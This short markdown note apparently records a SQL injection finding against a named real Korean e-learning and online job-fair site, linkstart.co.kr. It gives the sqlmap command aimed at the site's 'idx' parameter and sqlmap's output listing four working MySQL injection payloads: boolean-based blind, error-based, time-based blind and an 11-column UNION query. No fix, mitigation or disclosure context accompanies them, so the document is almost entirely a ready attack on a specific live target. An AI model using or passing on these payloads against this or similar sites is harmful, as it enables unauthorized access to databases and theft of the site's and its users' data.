linkstart 온라인 직무박람회 sql injection

http://linkstart.co.kr/

E-learning platform providing online lectures on career development (career, employment, entrepreneurship)

## sqlmap
```
sqlmap -u "url/live/live_sub01_view.html?idx=1"
```
```
Parameter: idx (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: idx=1' RLIKE (SELECT (CASE WHEN (6867=6867) THEN 1 ELSE 0x28 END))-- oKGs

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: idx=1' AND (SELECT 9852 FROM(SELECT COUNT(*),CONCAT(0x71716b6271,(SELECT (ELT(9852=9852,1))),0x7162716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- QeMM

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: idx=1' AND (SELECT 8081 FROM (SELECT(SLEEP(5)))XhQu)-- Elkd

    Type: UNION query
    Title: MySQL UNION query (NULL) - 11 columns
    Payload: idx=-5580' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71716b6271,0x6278644442686a7653714f767a695964496c59784866637657717453734a6e5147724674634c7349,0x7162716a71),NULL,NULL,NULL,NULL,NULL,NULL#
```